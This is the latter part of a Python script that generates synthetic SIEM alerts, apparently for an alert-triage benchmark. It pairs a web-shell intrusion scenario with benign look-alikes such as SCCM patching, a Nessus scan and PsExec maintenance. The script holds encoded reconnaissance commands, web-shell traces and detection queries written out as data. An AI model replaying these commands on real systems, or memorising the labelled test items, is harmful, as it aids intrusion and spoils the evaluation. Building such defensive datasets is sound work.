                                                                                 "response": {"status_code": 200, "bytes": RNG.randint(200, 4000)}},
                "user_agent": {"original": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)"}}
               for i, q in enumerate(["", "c=d2hvYW1p", "c=aXBjb25maWcgL2FsbA==", "c=bmV0IHVzZXIgL2RvbWFpbg=="])]
        ev = iis + [sysmon_proc(ts(0, 25), "WEB-DMZ-01", "IIS APPPOOL\\DefaultAppPool", "C:\\Windows\\System32\\cmd.exe",
                                "cmd.exe /c whoami", "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                                "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v4.0\"",
                                cwd="C:\\inetpub\\wwwroot\\"),
                    {"@timestamp": ts(-1440), "event": {"provider": "Microsoft-Windows-Sysmon", "code": 11},
                     "winlog": {"event_data": {"Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                                               "TargetFilename": "C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\errorEE.aspx"}}}]
        S = envelope(aid, "Web Server Process Spawned Shell", "critical", 90, "Elastic Security", h, u, ev,
                     {"internet_exposed": True, "last_vuln_scan": {"critical_findings": 2, "date": "2026-09-30"},
                      "change_management": {"open_changes_for_host": []}},
                     'process.parent.name:"w3wp.exe" and process.name:("cmd.exe" or "powershell.exe")')
    # ------------------------------------------------------------------ benign look-alikes
    elif aid == "B00":
        h = host("WKS-512", owner_dept="Customer Service")
        u = user("svc_sccm", "IT", "Service account", ("Domain Users", "SCCM-Service"))
        enc = b64ps("Get-HotFix | Where-Object {$_.InstalledOn -gt (Get-Date).AddDays(-1)} | "
                    "Export-Csv C:\\Windows\\CCM\\Logs\\patch_check.csv -NoTypeInformation")
        ev = [sysmon_proc(ts(0), "WKS-512", "CORP\\svc_sccm",
                          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                          f"powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {enc}",
                          "C:\\Windows\\CCM\\CcmExec.exe", "C:\\Windows\\CCM\\CcmExec.exe", "System")]
        ev.append({"aggregated_similar_events": {"same_command_hash_hosts": 120, "window": "45m"}})
        S = envelope(aid, "PowerShell EncodedCommand Execution", "high", 73, "Elastic Security", h, u, ev,
                     {"change_management": {"open_changes_for_host": [{"id": "CHG-4471", "title": "October cumulative patch deployment",
                                                                       "window": "2026-10-12T07:00Z/2026-10-12T11:00Z",
                                                                       "deployment_tool": "SCCM", "approved_by": "CAB"}]},
                      "account_profile": {"svc_sccm_baseline": "runs encoded PowerShell during patch windows"}},
                     'process.name:"powershell.exe" and process.args:("-EncodedCommand" or "-enc")')
    elif aid == "B01":
        h = host("SEC-SCAN-01", "Rocky Linux 9.4", "5.14", "vulnerability scanner", "medium", "Security")
        u = user("nessus", "Security", "Scanner service account")
        ev = [net_conn(ts(0, i), h["ip"][0], internal_ip(f"t{i}"), p, bytes_out=60, bytes_in=0,
                       extra={"zeek": {"conn_state": "S0" if i % 3 else "REJ", "history": "S"}})
              for i, p in enumerate([22, 23, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5985, 8080])]
        ev.append({"aggregated_similar_events": {"distinct_dest_ports": 1024, "distinct_dest_hosts": 312, "window": "30m"}})
        S = envelope(aid, "Internal Port Scan Detected", "medium", 55, "Splunk Enterprise Security", h, u, ev,
                     {"asset_tags": ["authorized-scanner"], "change_management": {"open_changes_for_host": [
                         {"id": "CHG-2231", "title": "Monthly authenticated Nessus scan", "window": "2026-10-12T06:00Z/2026-10-12T12:00Z"}]}},
                     "| tstats dc(dest_port) from datamodel=Network_Traffic by src | where dc > 100")
    elif aid == "B02":
        h = host("SRV-BKP-02", "Windows Server 2022 Standard", "20348.2762", "backup server", "high", "IT")
        u = user("svc_backup", "IT", "Service account", ("Domain Users", "Backup Operators"))
        task_xml = ("<Task><Triggers><CalendarTrigger><StartBoundary>2026-10-12T23:00:00</StartBoundary>"
                    "<ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers>"
                    "<Actions><Exec><Command>C:\\Program Files\\Veeam\\Backup and Replication\\Console\\veeam.backup.manager.exe"
                    "</Command><Arguments>startbackupjob \"Nightly-FS\"</Arguments></Exec></Actions></Task>")
        ev = [win_event(ts(0), "SRV-BKP-02", 4698, "scheduled-task-created",
                        {"SubjectUserName": "svc_backup", "SubjectDomainName": "CORP",
                         "TaskName": "\\Veeam\\Nightly-FS", "TaskContent": task_xml})]
        S = envelope(aid, "Scheduled Task Created on Server", "medium", 47, "Microsoft Sentinel", h, u, ev,
                     {"file_signature": {"veeam.backup.manager.exe": "signed: Veeam Software Group GmbH"},
                      "change_management": {"open_changes_for_host": [{"id": "CHG-4502", "title": "Reconfigure nightly file-server backup"}]}},
                     "SecurityEvent | where EventID == 4698")
    elif aid == "B05":
        h = host("ADM-JUMP-01", "Windows Server 2022 Standard", "20348.2762", "admin jump server", "high", "IT")
        u = user("adm_kbenali", "IT", "Systems Administrator", ("Domain Users", "Server Admins", "PAM-Users"))
        ev = [sysmon_proc(ts(0), "ADM-JUMP-01", "CORP\\adm_kbenali", "C:\\Tools\\Sysinternals\\PsExec64.exe",
                          "PsExec64.exe \\\\SRV-APP-04 -s C:\\Windows\\System32\\inetsrv\\appcmd.exe recycle apppool /apppool.name:Portal",
                          "C:\\Windows\\System32\\cmd.exe", "cmd.exe")]
        ev.append(win_event(ts(0, 3), "SRV-APP-04", 7045, "service-installed",
                            {"ServiceName": "PSEXESVC", "ImagePath": "%SystemRoot%\\PSEXESVC.exe", "AccountName": "LocalSystem"},
                            channel="System", provider="Service Control Manager"))
        S = envelope(aid, "PsExec Remote Service Installation", "medium", 58, "Microsoft Sentinel", h, u, ev,
                     {"pam_session": {"id": "PAM-88213", "approved": True, "recorded": True},
                      "change_management": {"open_changes_for_host": [{"id": "CHG-4490", "title": "Portal app pool recycle - maintenance"}]}},
                     "Event | where EventID == 7045 and ServiceName == 'PSEXESVC'")
    elif aid == "B06":
        h = host("WKS-330", owner_dept="Finance")
        u = user("nalaoui", "Finance", "Finance Controller")
        ev = [proxy(ts(i * 4), h["ip"][0], "nalaoui", f"https://contoso-my.sharepoint.example.com/personal/nalaoui/_api/web/upload{i}",
                    method="PUT", bytes_out=RNG.randint(500, 700) * 10 ** 6, bytes_in=1840, category="Sanctioned SaaS",
                    ua="Microsoft SkyDriveSync 24.181.0908.0001 ship; Windows NT 10.0 (19045)") for i in range(5)]
        S = envelope(aid, "Large Outbound Upload to Cloud Storage", "high", 74, "Splunk Enterprise Security", h, u, ev,
                     {"sanctioned_cloud_apps": ["contoso-my.sharepoint.example.com"], "business_calendar": "month-end close (Oct 29-31)",
                      "change_management": {"open_changes_for_host": []}},
                     "| tstats sum(bytes_out) from datamodel=Web where category=\"*Storage*\" OR category=\"Sanctioned SaaS\" by user dest | where sum > 1e9",
                     extra={"@timestamp": "2026-10-30T16:12:00Z"})
    elif aid == "B08":
        h = host("CA-01", "Windows Server 2022 Datacenter", "20348.2762", "internal certificate authority", "critical", "IT")
        u = user("pki_admin", "IT", "PKI Administrator", ("Domain Users", "PKI-Admins", "PAM-Users"))
        ev = [sysmon_proc(ts(0), "CA-01", "CORP\\pki_admin", "C:\\Windows\\System32\\certutil.exe",
                          "certutil.exe -exportPFX -p ******** My 4f2a9c1e00000000001a D:\\PKI\\Export\\webportal2026.pfx",
                          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe", "High")]
        S = envelope(aid, "Certutil Suspicious Usage", "medium", 52, "Elastic Security", h, u, ev,
                     {"pam_session": {"id": "PAM-88301", "approved": True},
                      "change_management": {"open_changes_for_host": [{"id": "CHG-4511", "title": "Renew web portal TLS certificate"}]}},
                     'process.name:"certutil.exe" and process.args:("-urlcache" or "-decode" or "-exportPFX")')
    elif aid == "B15":
        h = host("SRV-FS-03", "Windows Server 2019 Standard", "17763.6293", "file server", "high", "IT")
        u = user("svc_veeam", "IT", "Service account", ("Domain Users", "Backup Operators"))
        ev = [sysmon_proc(ts(0), "SRV-FS-03", "CORP\\svc_veeam", "C:\\Windows\\System32\\vssadmin.exe",
                          "vssadmin.exe Resize ShadowStorage /For=D: /On=D: /MaxSize=15%",
                          "C:\\Program Files\\Veeam\\Endpoint Backup\\Veeam.EndPoint.Service.exe",
                          "\"C:\\Program Files\\Veeam\\Endpoint Backup\\Veeam.EndPoint.Service.exe\"", "System")]
        S = envelope(aid, "Shadow Copy Manipulation via Vssadmin", "high", 70, "Elastic Security", h, u, ev,
                     {"parent_signature": "signed: Veeam Software Group GmbH",
                      "change_management": {"open_changes_for_host": [{"id": "CHG-4499", "title": "Backup storage maintenance window"}]}},
                     'process.name:"vssadmin.exe" and process.args:("delete" or "resize")')
    elif aid == "B21":
        h = host("SRV-AUDIT-01", "Windows Server 2022 Standard", "20348.2762", "IT audit server", "medium", "IT")
        u = user("svc_audit", "IT", "Service account", ("Domain Users", "Audit-Readers"))
        ev = [sysmon_proc(ts(0, i), "SRV-AUDIT-01", "CORP\\svc_audit", "C:\\Windows\\System32\\net.exe",
                          f"net.exe group \"{g}\" /domain",
                          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                          "powershell.exe -File C:\\Scripts\\Audit\\Q4_access_review.ps1")
              for i, g in enumerate(["Domain Admins", "Enterprise Admins", "Schema Admins", "Backup Operators"])]
        ev.append(win_event(ts(0, -5), "SRV-AUDIT-01", 4698, "scheduled-task-run",
                            {"TaskName": "\\IT-Audit\\Quarterly-Access-Review", "SubjectUserName": "svc_audit"},
                            channel="Microsoft-Windows-TaskScheduler/Operational", provider="Microsoft-Windows-TaskScheduler"))
        S = envelope(aid, "Domain Group Enumeration via Net.exe", "medium", 49, "Elastic Security", h, u, ev,
                     {"script_owner": "IT Governance", "schedule": "quarterly",
                      "change_management": {"open_changes_for_host": [{"id": "STD-0042", "title": "Standard change: quarterly access review"}]}},
                     'process.name:"net.exe" and process.args:"group" and process.args:"/domain"')
    else:
        raise KeyError(aid)
    return json.dumps(S, ensure_ascii=False)


def main():
    with open(SRC, encoding="utf-8") as f:
        base = {r["alert_id"]: r for r in csv.DictReader(f)}
    rows = []
    for aid in VERBOSE_IDS:
        r = base[aid]
        rows.append({"alert_id": f"V-{aid}", "pair_id": aid, "variant": "verbose", "alert": build(aid),
                     "label": r["label"], "category": r["category"], "mitre_gt": r["mitre_gt"],
                     "source": "synthetic_siem_verbose_v3"})
    for aid in CONTROL_IDS:
        r = base[aid]
        rows.append({"alert_id": f"C-{aid}", "pair_id": aid, "variant": "control", "alert": r["alert"],
                     "label": r["label"], "category": r["category"], "mitre_gt": r["mitre_gt"],
                     "source": r["source"]})
    with open(DST, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)
    lens = [len(r["alert"]) for r in rows if r["variant"] == "verbose"]
    print(f"{len(rows)} lignes écrites dans {DST} ({len(VERBOSE_IDS)} verbeuses, {len(CONTROL_IDS)} contrôles)")
    print(f"Longueur des alertes verbeuses : min {min(lens)}, médiane {sorted(lens)[len(lens)//2]}, max {max(lens)} caractères")


if __name__ == "__main__":
    main()
